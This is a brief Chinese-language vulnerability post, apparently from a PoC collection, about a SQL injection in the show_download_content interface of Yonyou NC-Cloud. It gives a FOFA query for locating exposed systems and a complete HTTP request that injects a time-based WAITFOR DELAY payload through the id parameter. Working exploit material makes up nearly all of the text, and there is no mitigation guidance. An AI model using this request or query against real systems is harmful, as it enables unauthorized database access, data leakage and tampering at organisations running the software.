# 用友NC-Cloud系统show_download_content接口存在SQL注入漏洞

用友NC-Cloud系统show_download_content接口存在SQL注入漏洞，允许攻击者通过恶意构造的SQL语句操控数据库，从而导致数据泄露、篡改或破坏，严重威胁系统安全。

## fofa

```yaml
app="用友-NC-Cloud"
```

## poc

```javascript
GET /ebvp/infopub/show_download_content;.js?id=1';WAITFOR+DELAY+'0:0:6'-- HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: zh-CN
Connection: keep-alive
```

![img](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202409031847062.png)